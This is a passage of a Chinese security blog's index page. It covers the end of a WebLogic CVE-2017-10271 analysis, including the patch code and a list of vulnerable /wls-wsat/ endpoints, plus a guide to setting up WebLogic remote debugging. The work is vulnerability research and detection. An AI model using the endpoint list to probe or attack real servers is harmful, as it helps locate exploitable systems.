class="line">if(!”index”.equalsIgnoreCase(attributes.getQName(attClass))) &#123;</span><br><span class="line">throw newIllegalStateException(“Invalid attribute for element void:” +attributes.getQName(attClass));</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​    但是我之前调试的时候发现startElement应该是XMLDecoder类实现的，而这个类是jdk的一个类，经过跟进weblogic的xmldecoder.readobject方法后，我发现weblogic调用的readobject后的调用链和jdk提供的xmldecoder调用链是不一样的，它在调用过程中还是会调用一些weblogic自己实现的一些类。</p>
<p><img src="/2020/10/30/weblogic%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E4%B9%8BCVE-2017-10271%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201113150901231.png" alt="image-20201113150901231"></p>
<h2 id="漏洞检测"><a href="#漏洞检测" class="headerlink" title="漏洞检测"></a>漏洞检测</h2><p>​    经过分析我们知道这个漏洞的触发并不是一定必须访问/wls-wsat/CoordinatorPortType接口,wls-wsat.war下web.xml中定义的所有关于webservice的接口都是可以触发这个漏洞的，可以触发该漏洞的接口如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;wls-wsat&#x2F;CoordinatorPortType</span><br><span class="line">&#x2F;wls-wsat&#x2F;RegistrationPortTypeRPC</span><br><span class="line">&#x2F;wls-wsat&#x2F;ParticipantPortType</span><br><span class="line">&#x2F;wls-wsat&#x2F;RegistrationRequesterPortType</span><br><span class="line">&#x2F;wls-wsat&#x2F;CoordinatorPortType11</span><br><span class="line">&#x2F;wls-wsat&#x2F;RegistrationPortTypeRPC11</span><br><span class="line">&#x2F;wls-wsat&#x2F;ParticipantPortType11</span><br><span class="line">&#x2F;wls-wsat&#x2F;RegistrationRequesterPortType11</span><br></pre></td></tr></table></figure>

<p>​    既然这个漏洞是请求webservice接口导致的，那么我想找一下是否有其他请求webservice的接口，因为webservice都会有webservices.xml这个配置文件，因此应该是没其他调用webservice接口的地址了。</p>
<p><img src="/2020/10/30/weblogic%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E4%B9%8BCVE-2017-10271%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201113115929868.png" alt="image-20201113115929868"></p>
<p>​    另外由于weblogic的补丁并不是将wls-wsat.war删除，而是找了一个做了一些黑名单过滤，因此单单通过访问/wls-wsat/下的接口判断是否存在是不行的，不过可以将判断这些接口是否存在当作一个参考，毕竟只有当这些接口存在是，才能触发这个漏洞，有些waf在防御这个漏洞是更是粗暴简单只要访问了这个wls-wsat目录下的内容，全部拒绝。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

        
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="cn">
    <link itemprop="mainEntityOfPage" href="https://cangqingzhe.github.io/2020/10/30/weblogic%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E4%B9%8B%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="藏青">
      <meta itemprop="description" content="知行合一">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="藏青's BLOG">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          
            <a href="/2020/10/30/weblogic%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E4%B9%8B%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/" class="post-title-link" itemprop="url">weblogic漏洞分析系列之调试环境搭建</a>
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2020-10-30 20:32:17" itemprop="dateCreated datePublished" datetime="2020-10-30T20:32:17+08:00">2020-10-30</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2020-10-31 10:12:54" itemprop="dateModified" datetime="2020-10-31T10:12:54+08:00">2020-10-31</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" itemprop="url" rel="index">
                    <span itemprop="name">漏洞分析</span>
                  </a>
                </span>
                  , 
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" itemprop="url" rel="index">
                    <span itemprop="name">代码审计</span>
                  </a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>​        最近一直在做一些项目，因为对一些原理性的知识不懂感觉渗透很难再继续往上走，因此接下来打算将精力放在漏洞的理解和分析，工具的编写和优化上面，而不再执着于更多的技巧。</p>
<p>​        weblogic是一款比较经常使用的java容器，当然它爆出的漏洞也是层出不穷，为了能让自己更加了解weblogic漏洞的形成原因，我决定和大家一起调试weblogic各个版本的一些漏洞，并最终编写一个简单的weblogic漏洞检测工具，在这片文章中，我们首先一起来学习一下如何搭建weblogic的调试环境。</p>
<h2 id="调试环境搭建"><a href="#调试环境搭建" class="headerlink" title="调试环境搭建"></a>调试环境搭建</h2><p>​        首先，在官网下载weblogic的安装包，双击进行安装</p>
<p><img src="/2020/10/30/weblogic%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E4%B9%8B%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/image-20201030210608351.png" alt="image-20201030210608351"></p>
<p>​        安装好以后，创建weblogic域</p>
<p><img src="/2020/10/30/weblogic%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E4%B9%8B%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/image-20201030210658376.png" alt="image-20201030210658376"></p>
<p>​        安装成功后，在domains下的bin目录下有个startWebLogic.cmd文件</p>
<p><img src="/2020/10/30/weblogic%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E4%B9%8B%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/image-20201030210904700.png" alt="image-20201030210904700"></p>
<p>​        编辑startWebLogic.cmd文件，在文件的开头加上如下内容</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set JAVA_OPTIONS&#x3D;-Xdebug -Xnoagent -Djava.compiler&#x3D;NONE -Xrunjdwp:transport&#x3D;dt_socket,address&#x3D;9999,server&#x3D;y,suspend&#x3D;n</span><br></pre></td></tr></table></figure>

<p><img src="/2020/10/30/weblogic%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E4%B9%8B%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/image-20201030204516719.png" alt="image-20201030204516719"></p>
<p>​        双击startWebLogic.cmd启动weblogic,可以看到已经开启了9999端口的监听</p>
<p><img src="/2020/10/30/weblogic%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E4%B9%8B%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/image-20201030210943558.png" alt="image-20201030210943558"></p>
<p>​        同时使用netstat查看，也可以看到9999端口的监听</p>
<p><img src="/2020/10/30/weblogic%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E4%B9%8B%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/image-20201030211009015.png" alt="image-20201030211009015"></p>
<p>​        打开idea,import wlserver_10.3这个目录</p>
<p><img src="/2020/10/30/weblogic%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E4%B9%8B%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/image-20201030211258783.png" alt="image-20201030211258783"></p>
<p>​        在server/lib目录上选择add as library</p>
<p><img src="/2020/10/30/weblogic%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E4%B9%8B%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/image-20201030211344142.png" alt="image-20201030211344142"></p>
<p>​        选择调试配置</p>
<p><img src="/2020/10/30/weblogic%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E4%B9%8B%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/image-20201030211447373.png" alt="image-20201030211447373"></p>
<p>​        添加一个remote的配置</p>
<p><img src="/2020/10/30/weblogic%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E4%B9%8B%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/image-20201030230633634.png" alt="image-20201030230633634"></p>
<p>端口选择9999端口</p>
<p><img src="/2020/10/30/weblogic%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E4%B9%8B%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/image-20201030230709499.png" alt="image-20201030230709499"></p>
<p>​        我们再点击debug，如果成功则会出现Connected to the target VM, address: ‘127.0.0.1:9999’, transport: ‘socket’，没成功的话可以重新运行startWebLogic.cmd文件再去debug。</p>
<p><img src="/2020/10/30/weblogic%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E4%B9%8B%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/image-20201030230745586.png" alt="image-20201030230745586"></p>
<p>​        为了测试能否下断点，我们首先测试一下CVE-2017-10271这个漏洞，再漏洞的返回包中查看调用链，这里可以看到调用了weblogic.wsee.workarea.WorkContextXmlInputAdapter类的readUTF方法</p>
<p><img src="/2020/10/30/weblogic%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E4%B9%8B%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/image-20201030230958127.png" alt="image-20201030230958127"></p>
<p>​        我们找到readUTF方法并下断点，查看能否断住，我这里可以成功下到断点，至此，weblogic的调试环境搭建成功。</p>
<p><img src="/2020/10/30/weblogic%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E4%B9%8B%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/image-20201030231147688.png" alt="image-20201030231147688"></p>
<h2 id="JDK内置函数无法继续跟踪"><a href="#JDK内置函数无法继续跟踪" class="headerlink" title="JDK内置函数无法继续跟踪"></a>JDK内置函数无法继续跟踪</h2><p>​        在调试过程中，发现当调用xlDecoder.readObject()函数时，无法继续深入跟踪，在idea的顶部也有一个报错。</p>
<p><img src="/2020/10/30/weblogic%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E4%B9%8B%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/image-20201031095622944.png" alt="image-20201031095622944"></p>
<p>​        经过分析weblogic默认使用自带的jdk6来编译运行，而我使用的是jdk8,因此需要改变jdk的版本。选择 <code>Project Structure</code>，在project中new一个jdk，选择weblogic自带的jdk，如下如图所示：</p>
<p><img src="/2020/10/30/weblogic%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E4%B9%8B%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/image-20201031100649371.png" alt="image-20201031100649371"></p>
<p>​        修改以后即可跟踪到readObject这个函数的执行过程</p>
<p><img src="/2020/10/30/weblogic%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E4%B9%8B%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/image-20201031101247175.png" alt="image-20201031101247175"></p>
<p><strong>参考文章</strong></p>
<p><a href="https://badcode.cc/2018/05/20/WebLogic-%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/" target="_blank" rel="noopener">WebLogic-动态调试环境搭建</a></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

        
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="cn">
    <link itemprop="mainEntityOfPage" href="https://cangqingzhe.github.io/2020/09/09/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E7%9A%84%E7%89%B9%E5%BE%81%E5%88%86%E6%9E%90/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="藏青">
      <meta itemprop="description" content="知行合一">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="藏青's BLOG">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          
            <a href="/2020/09/09/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E7%9A%84%E7%89%B9%E5%BE%81%E5%88%86%E6%9E%90/" class="post-title-link" itemprop="url">关于内网横向渗透的特征分析</a>
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2020-09-09 11:48:20 / Modified: 11:48:34" itemprop="dateCreated datePublished" datetime="2020-09-09T11:48:20+08:00">2020-09-09</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          
      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

  </div>

  
  <nav class="pagination">
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><span class="space">&hellip;</span><a class="page-number" href="/page/4/">4</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right" aria-label="Next page"></i></a>
  </nav>



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let activeClass = CONFIG.comments.activeClass;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">藏青</p>
  <div class="site-description" itemprop="description">知行合一</div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">33</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">9</span>
        <span class="site-state-item-name">categories</span></a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">17</span>
        <span class="site-state-item-name">tags</span></a>
      </div>
  </nav>
</div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2020</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">藏青</span>
</div>
  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> v4.2.0
  </div>
  <span class="post-meta-divider">|</span>
  <div class="theme-info">Theme – <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> v7.7.1
  </div>

    <script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>

        
<div class="busuanzi-count">
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
</div>








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/muse.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  

</body>
</html>
